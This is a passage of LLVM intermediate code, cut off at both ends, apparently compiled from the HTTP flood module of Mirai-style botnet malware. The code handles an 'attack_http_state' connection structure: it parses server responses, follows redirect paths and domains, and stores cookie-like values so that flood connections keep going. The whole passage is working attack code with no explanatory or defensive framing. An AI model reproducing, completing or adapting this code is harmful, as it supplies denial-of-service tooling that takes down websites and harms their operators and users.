  %1823 = getelementptr inbounds i8, i8* %1820, i64 %1822
  %1824 = load i8*, i8** %57, align 8
  %1825 = load i32, i32* %10, align 4
  %1826 = sext i32 %1825 to i64
  %1827 = getelementptr inbounds i8, i8* %1824, i64 %1826
  %1828 = call i32 @util_strlen(i8* %1827)
  %1829 = call i32 @util_stristr(i8* %1823, i32 %1828, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1830 = icmp ne i32 %1829, -1
  br i1 %1830, label %1831, label %1844

; <label>:1831:                                   ; preds = %1819
  %1832 = load i8*, i8** %57, align 8
  %1833 = load i32, i32* %10, align 4
  %1834 = sext i32 %1833 to i64
  %1835 = getelementptr inbounds i8, i8* %1832, i64 %1834
  %1836 = load i8*, i8** %57, align 8
  %1837 = load i32, i32* %10, align 4
  %1838 = sext i32 %1837 to i64
  %1839 = getelementptr inbounds i8, i8* %1836, i64 %1838
  %1840 = call i32 @util_strlen(i8* %1839)
  %1841 = call i32 @util_stristr(i8* %1835, i32 %1840, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1842 = load i32, i32* %10, align 4
  %1843 = add nsw i32 %1842, %1841
  store i32 %1843, i32* %10, align 4
  br label %1844

; <label>:1844:                                   ; preds = %1831, %1819
  %1845 = load i8*, i8** %57, align 8
  %1846 = load i32, i32* %10, align 4
  %1847 = sext i32 %1846 to i64
  %1848 = getelementptr inbounds i8, i8* %1845, i64 %1847
  %1849 = load i8, i8* %1848, align 1
  %1850 = sext i8 %1849 to i32
  %1851 = icmp eq i32 %1850, 34
  br i1 %1851, label %1852, label %1884

; <label>:1852:                                   ; preds = %1844
  %1853 = load i32, i32* %10, align 4
  %1854 = add nsw i32 %1853, 1
  store i32 %1854, i32* %10, align 4
  %1855 = load i8*, i8** %57, align 8
  %1856 = load i32, i32* %10, align 4
  %1857 = sext i32 %1856 to i64
  %1858 = getelementptr inbounds i8, i8* %1855, i64 %1857
  %1859 = load i8*, i8** %57, align 8
  %1860 = load i32, i32* %10, align 4
  %1861 = sext i32 %1860 to i64
  %1862 = getelementptr inbounds i8, i8* %1859, i64 %1861
  %1863 = call i32 @util_strlen(i8* %1862)
  %1864 = sub nsw i32 %1863, 1
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds i8, i8* %1858, i64 %1865
  %1867 = load i8, i8* %1866, align 1
  %1868 = sext i8 %1867 to i32
  %1869 = icmp eq i32 %1868, 34
  br i1 %1869, label %1870, label %1883

; <label>:1870:                                   ; preds = %1852
  %1871 = load i8*, i8** %57, align 8
  %1872 = load i32, i32* %10, align 4
  %1873 = sext i32 %1872 to i64
  %1874 = getelementptr inbounds i8, i8* %1871, i64 %1873
  %1875 = load i8*, i8** %57, align 8
  %1876 = load i32, i32* %10, align 4
  %1877 = sext i32 %1876 to i64
  %1878 = getelementptr inbounds i8, i8* %1875, i64 %1877
  %1879 = call i32 @util_strlen(i8* %1878)
  %1880 = sub nsw i32 %1879, 1
  %1881 = sext i32 %1880 to i64
  %1882 = getelementptr inbounds i8, i8* %1874, i64 %1881
  store i8 0, i8* %1882, align 1
  br label %1883

; <label>:1883:                                   ; preds = %1870, %1852
  br label %1884

; <label>:1884:                                   ; preds = %1883, %1844
  %1885 = load i8*, i8** %57, align 8
  %1886 = call i32 @util_atoi(i8* %1885, i32 10)
  store i32 %1886, i32* %58, align 4
  br label %1887

; <label>:1887:                                   ; preds = %1902, %1884
  %1888 = load i32, i32* %58, align 4
  %1889 = icmp sgt i32 %1888, 0
  br i1 %1889, label %1890, label %1900

; <label>:1890:                                   ; preds = %1887
  %1891 = load i32, i32* %58, align 4
  %1892 = icmp slt i32 %1891, 10
  br i1 %1892, label %1893, label %1900

; <label>:1893:                                   ; preds = %1890
  %1894 = load i32, i32* %27, align 4
  %1895 = load i32, i32* %58, align 4
  %1896 = add i32 %1894, %1895
  %1897 = zext i32 %1896 to i64
  %1898 = call i64 @time(i64* null) #6
  %1899 = icmp sgt i64 %1897, %1898
  br label %1900

; <label>:1900:                                   ; preds = %1893, %1890, %1887
  %1901 = phi i1 [ false, %1890 ], [ false, %1887 ], [ %1899, %1893 ]
  br i1 %1901, label %1902, label %1904

; <label>:1902:                                   ; preds = %1900
  %1903 = call i32 @sleep(i32 1)
  br label %1887

; <label>:1904:                                   ; preds = %1900
  %1905 = load i8*, i8** %57, align 8
  %1906 = load i32, i32* %10, align 4
  %1907 = sext i32 %1906 to i64
  %1908 = getelementptr inbounds i8, i8* %1905, i64 %1907
  store i8* %1908, i8** %57, align 8
  %1909 = load i8*, i8** %57, align 8
  %1910 = load i8*, i8** %57, align 8
  %1911 = call i32 @util_strlen(i8* %1910)
  %1912 = call i32 @util_stristr(i8* %1909, i32 %1911, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %1913 = icmp eq i32 %1912, 4
  br i1 %1913, label %1914, label %2004

; <label>:1914:                                   ; preds = %1904
  store i32 7, i32* %10, align 4
  %1915 = load i8*, i8** %57, align 8
  %1916 = getelementptr inbounds i8, i8* %1915, i64 4
  %1917 = load i8, i8* %1916, align 1
  %1918 = sext i8 %1917 to i32
  %1919 = icmp eq i32 %1918, 115
  br i1 %1919, label %1920, label %1923

; <label>:1920:                                   ; preds = %1914
  %1921 = load i32, i32* %10, align 4
  %1922 = add nsw i32 %1921, 1
  store i32 %1922, i32* %10, align 4
  br label %1923

; <label>:1923:                                   ; preds = %1920, %1914
  %1924 = load i8*, i8** %57, align 8
  %1925 = load i8*, i8** %57, align 8
  %1926 = load i32, i32* %10, align 4
  %1927 = sext i32 %1926 to i64
  %1928 = getelementptr inbounds i8, i8* %1925, i64 %1927
  %1929 = load i32, i32* %56, align 4
  %1930 = load i32, i32* %10, align 4
  %1931 = sub nsw i32 %1929, %1930
  %1932 = sext i32 %1931 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1924, i8* %1928, i64 %1932, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1933

; <label>:1933:                                   ; preds = %1954, %1923
  %1934 = load i8*, i8** %57, align 8
  %1935 = load i32, i32* %10, align 4
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds i8, i8* %1934, i64 %1936
  %1938 = load i8, i8* %1937, align 1
  %1939 = sext i8 %1938 to i32
  %1940 = icmp ne i32 %1939, 0
  br i1 %1940, label %1941, label %1957

; <label>:1941:                                   ; preds = %1933
  %1942 = load i8*, i8** %57, align 8
  %1943 = load i32, i32* %10, align 4
  %1944 = sext i32 %1943 to i64
  %1945 = getelementptr inbounds i8, i8* %1942, i64 %1944
  %1946 = load i8, i8* %1945, align 1
  %1947 = sext i8 %1946 to i32
  %1948 = icmp eq i32 %1947, 47
  br i1 %1948, label %1949, label %1954

; <label>:1949:                                   ; preds = %1941
  %1950 = load i8*, i8** %57, align 8
  %1951 = load i32, i32* %10, align 4
  %1952 = sext i32 %1951 to i64
  %1953 = getelementptr inbounds i8, i8* %1950, i64 %1952
  store i8 0, i8* %1953, align 1
  br label %1957

; <label>:1954:                                   ; preds = %1941
  %1955 = load i32, i32* %10, align 4
  %1956 = add nsw i32 %1955, 1
  store i32 %1956, i32* %10, align 4
  br label %1933

; <label>:1957:                                   ; preds = %1949, %1933
  %1958 = load i8*, i8** %57, align 8
  %1959 = call i32 @util_strlen(i8* %1958)
  %1960 = icmp sgt i32 %1959, 0
  br i1 %1960, label %1961, label %1971

; <label>:1961:                                   ; preds = %1957
  %1962 = load i8*, i8** %57, align 8
  %1963 = call i32 @util_strlen(i8* %1962)
  %1964 = icmp slt i32 %1963, 128
  br i1 %1964, label %1965, label %1971

; <label>:1965:                                   ; preds = %1961
  %1966 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1967 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1966, i32 0, i32 7
  %1968 = getelementptr inbounds [129 x i8], [129 x i8]* %1967, i32 0, i32 0
  %1969 = load i8*, i8** %57, align 8
  %1970 = call i32 @util_strcpy(i8* %1968, i8* %1969)
  br label %1971

; <label>:1971:                                   ; preds = %1965, %1961, %1957
  %1972 = load i8*, i8** %57, align 8
  %1973 = load i32, i32* %10, align 4
  %1974 = add nsw i32 %1973, 1
  %1975 = sext i32 %1974 to i64
  %1976 = getelementptr inbounds i8, i8* %1972, i64 %1975
  %1977 = call i32 @util_strlen(i8* %1976)
  %1978 = icmp slt i32 %1977, 256
  br i1 %1978, label %1979, label %2003

; <label>:1979:                                   ; preds = %1971
  %1980 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1981 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1980, i32 0, i32 6
  %1982 = getelementptr inbounds [257 x i8], [257 x i8]* %1981, i32 0, i32 0
  %1983 = getelementptr inbounds i8, i8* %1982, i64 1
  call void @util_zero(i8* %1983, i32 255)
  %1984 = load i8*, i8** %57, align 8
  %1985 = load i32, i32* %10, align 4
  %1986 = add nsw i32 %1985, 1
  %1987 = sext i32 %1986 to i64
  %1988 = getelementptr inbounds i8, i8* %1984, i64 %1987
  %1989 = call i32 @util_strlen(i8* %1988)
  %1990 = icmp sgt i32 %1989, 0
  br i1 %1990, label %1991, label %2002

; <label>:1991:                                   ; preds = %1979
  %1992 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1992, i32 0, i32 6
  %1994 = getelementptr inbounds [257 x i8], [257 x i8]* %1993, i32 0, i32 0
  %1995 = getelementptr inbounds i8, i8* %1994, i64 1
  %1996 = load i8*, i8** %57, align 8
  %1997 = load i32, i32* %10, align 4
  %1998 = add nsw i32 %1997, 1
  %1999 = sext i32 %1998 to i64
  %2000 = getelementptr inbounds i8, i8* %1996, i64 %1999
  %2001 = call i32 @util_strcpy(i8* %1995, i8* %2000)
  br label %2002

; <label>:2002:                                   ; preds = %1991, %1979
  br label %2003

; <label>:2003:                                   ; preds = %2002, %1971
  br label %2044

; <label>:2004:                                   ; preds = %1904
  %2005 = load i8*, i8** %57, align 8
  %2006 = getelementptr inbounds i8, i8* %2005, i64 0
  %2007 = load i8, i8* %2006, align 1
  %2008 = sext i8 %2007 to i32
  %2009 = icmp eq i32 %2008, 47
  br i1 %2009, label %2010, label %2043

; <label>:2010:                                   ; preds = %2004
  %2011 = load i8*, i8** %57, align 8
  %2012 = load i32, i32* %10, align 4
  %2013 = add nsw i32 %2012, 1
  %2014 = sext i32 %2013 to i64
  %2015 = getelementptr inbounds i8, i8* %2011, i64 %2014
  %2016 = call i32 @util_strlen(i8* %2015)
  %2017 = icmp slt i32 %2016, 256
  br i1 %2017, label %2018, label %2042

; <label>:2018:                                   ; preds = %2010
  %2019 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2020 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2019, i32 0, i32 6
  %2021 = getelementptr inbounds [257 x i8], [257 x i8]* %2020, i32 0, i32 0
  %2022 = getelementptr inbounds i8, i8* %2021, i64 1
  call void @util_zero(i8* %2022, i32 255)
  %2023 = load i8*, i8** %57, align 8
  %2024 = load i32, i32* %10, align 4
  %2025 = add nsw i32 %2024, 1
  %2026 = sext i32 %2025 to i64
  %2027 = getelementptr inbounds i8, i8* %2023, i64 %2026
  %2028 = call i32 @util_strlen(i8* %2027)
  %2029 = icmp sgt i32 %2028, 0
  br i1 %2029, label %2030, label %2041

; <label>:2030:                                   ; preds = %2018
  %2031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2031, i32 0, i32 6
  %2033 = getelementptr inbounds [257 x i8], [257 x i8]* %2032, i32 0, i32 0
  %2034 = getelementptr inbounds i8, i8* %2033, i64 1
  %2035 = load i8*, i8** %57, align 8
  %2036 = load i32, i32* %10, align 4
  %2037 = add nsw i32 %2036, 1
  %2038 = sext i32 %2037 to i64
  %2039 = getelementptr inbounds i8, i8* %2035, i64 %2038
  %2040 = call i32 @util_strcpy(i8* %2034, i8* %2039)
  br label %2041

; <label>:2041:                                   ; preds = %2030, %2018
  br label %2042

; <label>:2042:                                   ; preds = %2041, %2010
  br label %2043

; <label>:2043:                                   ; preds = %2042, %2004
  br label %2044

; <label>:2044:                                   ; preds = %2043, %2003
  %2045 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2046 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2045, i32 0, i32 9
  %2047 = getelementptr inbounds [9 x i8], [9 x i8]* %2046, i32 0, i32 0
  %2048 = call i8* @strcpy(i8* %2047, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2049 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2050 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2049, i32 0, i32 1
  store i8 10, i8* %2050, align 4
  br label %2531

; <label>:2051:                                   ; preds = %1794
  br label %2052

; <label>:2052:                                   ; preds = %2051, %1737
  br label %2053

; <label>:2053:                                   ; preds = %2052, %1717
  %2054 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2055 = load i32, i32* %12, align 4
  %2056 = call i32 @util_memsearch(i8* %2054, i32 %2055, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2056, i32* %37, align 4
  %2057 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2058 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2057, i32 0, i32 9
  %2059 = getelementptr inbounds [9 x i8], [9 x i8]* %2058, i32 0, i32 0
  %2060 = call signext i8 @util_strcmp(i8* %2059, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2061 = sext i8 %2060 to i32
  %2062 = icmp ne i32 %2061, 0
  br i1 %2062, label %2070, label %2063

; <label>:2063:                                   ; preds = %2053
  %2064 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2065 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2064, i32 0, i32 9
  %2066 = getelementptr inbounds [9 x i8], [9 x i8]* %2065, i32 0, i32 0
  %2067 = call signext i8 @util_strcmp(i8* %2066, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2068 = sext i8 %2067 to i32
  %2069 = icmp ne i32 %2068, 0
  br i1 %2069, label %2070, label %2073

; <label>:2070:                                   ; preds = %2063, %2053
  %2071 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2072 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2071, i32 0, i32 1
  store i8 7, i8* %2072, align 4
  br label %2084

; <label>:2073:                                   ; preds = %2063
  %2074 = load i32, i32* %12, align 4
  %2075 = load i32, i32* %37, align 4
  %2076 = icmp sgt i32 %2074, %2075
  br i1 %2076, label %2077, label %2080

; <label>:2077:                                   ; preds = %2073
  %2078 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2079 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2078, i32 0, i32 1
  store i8 10, i8* %2079, align 4
  br label %2083

; <label>:2080:                                   ; preds = %2073
  %2081 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2082 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2081, i32 0, i32 1
  store i8 1, i8* %2082, align 4
  br label %2083

; <label>:2083:                                   ; preds = %2080, %2077
  br label %2084

; <label>:2084:                                   ; preds = %2083, %2070
  %2085 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2086 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2085, i32 0, i32 0
  %2087 = load i32, i32* %2086, align 4
  %2088 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2089 = load i32, i32* %37, align 4
  %2090 = sext i32 %2089 to i64
  %2091 = call i64 @recv(i32 %2087, i8* %2088, i64 %2090, i32 16384)
  %2092 = trunc i64 %2091 to i32
  store i32 %2092, i32* %12, align 4
  br label %2529

; <label>:2093:                                   ; preds = %1124
  %2094 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2095 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2094, i32 0, i32 1
  %2096 = load i8, i8* %2095, align 4
  %2097 = zext i8 %2096 to i32
  %2098 = icmp eq i32 %2097, 7
  br i1 %2098, label %2099, label %2476

; <label>:2099:                                   ; preds = %2093
  br label %2100

; <label>:2100:                                   ; preds = %2474, %2099
  %2101 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2102 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2101, i32 0, i32 1
  %2103 = load i8, i8* %2102, align 4
  %2104 = zext i8 %2103 to i32
  %2105 = icmp ne i32 %2104, 7
  br i1 %2105, label %2106, label %2107

; <label>:2106:                                   ; preds = %2100
  br label %2475

; <label>:2107:                                   ; preds = %2100
  %2108 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2109 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2108, i32 0, i32 17
  %2110 = load i32, i32* %2109, align 4
  %2111 = icmp eq i32 %2110, 1024
  br i1 %2111, label %2112, label %2124

; <label>:2112:                                   ; preds = %2107
  %2113 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2114 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2113, i32 0, i32 18
  %2115 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2114, i32 0, i32 0
  %2116 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2116, i32 0, i32 18
  %2118 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2117, i32 0, i32 0
  %2119 = getelementptr inbounds i8, i8* %2118, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2115, i8* %2119, i64 960, i32 1, i1 false)
  %2120 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2121 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2120, i32 0, i32 17
  %2122 = load i32, i32* %2121, align 4
  %2123 = sub nsw i32 %2122, 64
  store i32 %2123, i32* %2121, align 4
  br label %2124

; <label>:2124:                                   ; preds = %2112, %2107
  %2125 = call i32* @__errno_location() #7
  store i32 0, i32* %2125, align 4
  %2126 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2127 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2126, i32 0, i32 0
  %2128 = load i32, i32* %2127, align 4
  %2129 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2130 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2129, i32 0, i32 18
  %2131 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2130, i32 0, i32 0
  %2132 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2132, i32 0, i32 17
  %2134 = load i32, i32* %2133, align 4
  %2135 = sext i32 %2134 to i64
  %2136 = getelementptr inbounds i8, i8* %2131, i64 %2135
  %2137 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2138 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2137, i32 0, i32 17
  %2139 = load i32, i32* %2138, align 4
  %2140 = sub nsw i32 1024, %2139
  %2141 = sext i32 %2140 to i64
  %2142 = call i64 @recv(i32 %2128, i8* %2136, i64 %2141, i32 16384)
  %2143 = trunc i64 %2142 to i32
  store i32 %2143, i32* %12, align 4
  %2144 = load i32, i32* %12, align 4
  %2145 = icmp eq i32 %2144, 0
  br i1 %2145, label %2146, label %2148

; <label>:2146:                                   ; preds = %2124
  %2147 = call i32* @__errno_location() #7
  store i32 104, i32* %2147, align 4
  store i32 -1, i32* %12, align 4
  br label %2148

; <label>:2148:                                   ; preds = %2146, %2124
  %2149 = load i32, i32* %12, align 4
  %2150 = icmp eq i32 %2149, -1
  br i1 %2150, label %2151, label %2169

; <label>:2151:                                   ; preds = %2148
  %2152 = call i32* @__errno_location() #7
  %2153 = load i32, i32* %2152, align 4
  %2154 = icmp ne i32 %2153, 11
  br i1 %2154, label %2155, label %2168

; <label>:2155:                                   ; preds = %2151
  %2156 = call i32* @__errno_location() #7
  %2157 = load i32, i32* %2156, align 4
  %2158 = icmp ne i32 %2157, 11
  br i1 %2158, label %2159, label %2168

; <label>:2159:                                   ; preds = %2155
  %2160 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2161 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2160, i32 0, i32 0
  %2162 = load i32, i32* %2161, align 4
  %2163 = call i32 @close(i32 %2162)
  %2164 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2165 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2164, i32 0, i32 0
  store i32 -1, i32* %2165, align 4
  %2166 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2166, i32 0, i32 1
  store i8 0, i8* %2167, align 4
  br label %2168

; <label>:2168:                                   ; preds = %2159, %2155, %2151
  br label %2475

; <label>:2169:                                   ; preds = %2148
  %2170 = load i32, i32* %12, align 4
  %2171 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2171, i32 0, i32 17
  %2173 = load i32, i32* %2172, align 4
  %2174 = add nsw i32 %2173, %2170
  store i32 %2174, i32* %2172, align 4
  %2175 = load i32, i32* %27, align 4
  %2176 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2176, i32 0, i32 2
  store i32 %2175, i32* %2177, align 4
  br label %2178

; <label>:2178:                                   ; preds = %2473, %2169
  store i32 0, i32* %59, align 4
  %2179 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2180 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2179, i32 0, i32 14
  %2181 = load i32, i32* %2180, align 4
  %2182 = icmp sgt i32 %2181, 0
  br i1 %2182, label %2183, label %2354

; <label>:2183:                                   ; preds = %2178
  %2184 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2185 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2184, i32 0, i32 14
  %2186 = load i32, i32* %2185, align 4
  %2187 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2188 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2187, i32 0, i32 17
  %2189 = load i32, i32* %2188, align 4
  %2190 = icmp sgt i32 %2186, %2189
  br i1 %2190, label %2191, label %2195

; <label>:2191:                                   ; preds = %2183
  %2192 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2193 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2192, i32 0, i32 17
  %2194 = load i32, i32* %2193, align 4
  br label %2199

; <label>:2195:                                   ; preds = %2183
  %2196 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2197 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2196, i32 0, i32 14
  %2198 = load i32, i32* %2197, align 4
  br label %2199

; <label>:2199:                                   ; preds = %2195, %2191
  %2200 = phi i32 [ %2194, %2191 ], [ %2198, %2195 ]
  store i32 %2200, i32* %59, align 4
  %2201 = load i32, i32* %59, align 4
  %2202 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2203 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2202, i32 0, i32 14
  %2204 = load i32, i32* %2203, align 4
  %2205 = sub nsw i32 %2204, %2201
  store i32 %2205, i32* %2203, align 4
  %2206 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2206, i32 0, i32 11
  %2208 = load i32, i32* %2207, align 4
  %2209 = icmp eq i32 %2208, 1
  br i1 %2209, label %2210, label %2353

; <label>:2210:                                   ; preds = %2199
  %2211 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2211, i32 0, i32 18
  %2213 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2212, i32 0, i32 0
  %2214 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2215 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2214, i32 0, i32 17
  %2216 = load i32, i32* %2215, align 4
  %2217 = call i8* @table_retrieve_val(i32 36, i32* null)
  %2218 = call i32 @util_memsearch(i8* %2213, i32 %2216, i8* %2217, i32 11)
  %2219 = icmp ne i32 %2218, -1
  br i1 %2219, label %2220, label %2352

; <label>:2220:                                   ; preds = %2210
  %2221 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2222 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2221, i32 0, i32 18
  %2223 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2222, i32 0, i32 0
  %2224 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2225 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2224, i32 0, i32 17
  %2226 = load i32, i32* %2225, align 4
  %2227 = call i8* @table_retrieve_val(i32 36, i32* null)
  %2228 = call i32 @util_memsearch(i8* %2223, i32 %2226, i8* %2227, i32 11)
  store i32 %2228, i32* %60, align 4
  %2229 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2230 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2229, i32 0, i32 18
  %2231 = load i32, i32* %60, align 4
  %2232 = sext i32 %2231 to i64
  %2233 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2230, i64 0, i64 %2232
  %2234 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2234, i32 0, i32 17
  %2236 = load i32, i32* %2235, align 4
  %2237 = load i32, i32* %60, align 4
  %2238 = sub nsw i32 %2236, %2237
  %2239 = call i32 @util_memsearch(i8* %2233, i32 %2238, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2239, i32* %61, align 4
  %2240 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2241 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2240, i32 0, i32 18
  %2242 = load i32, i32* %60, align 4
  %2243 = load i32, i32* %61, align 4
  %2244 = sub nsw i32 %2243, 1
  %2245 = add nsw i32 %2242, %2244
  %2246 = sext i32 %2245 to i64
  %2247 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2241, i64 0, i64 %2246
  store i8 0, i8* %2247, align 1
  %2248 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2248, i32 0, i32 15
  %2250 = load i32, i32* %2249, align 4
  %2251 = icmp slt i32 %2250, 5
  br i1 %2251, label %2252, label %2347

; <label>:2252:                                   ; preds = %2220
  %2253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2253, i32 0, i32 18
  %2255 = load i32, i32* %60, align 4
  %2256 = sext i32 %2255 to i64
  %2257 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2254, i64 0, i64 %2256
  %2258 = call i32 @util_strlen(i8* %2257)
  %2259 = icmp slt i32 %2258, 128
  br i1 %2259, label %2260, label %2347

; <label>:2260:                                   ; preds = %2252
  %2261 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2262 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2261, i32 0, i32 16
  %2263 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2263, i32 0, i32 15
  %2265 = load i32, i32* %2264, align 4
  %2266 = sext i32 %2265 to i64
  %2267 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2262, i64 0, i64 %2266
  %2268 = getelementptr inbounds [128 x i8], [128 x i8]* %2267, i32 0, i32 0
  %2269 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2269, i32 0, i32 18
  %2271 = load i32, i32* %60, align 4
  %2272 = sext i32 %2271 to i64
  %2273 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2270, i64 0, i64 %2272
  %2274 = call i32 @util_strcpy(i8* %2268, i8* %2273)
  %2275 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2276 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2275, i32 0, i32 16
  %2277 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2278 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2277, i32 0, i32 15
  %2279 = load i32, i32* %2278, align 4
  %2280 = sext i32 %2279 to i64
  %2281 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2276, i64 0, i64 %2280
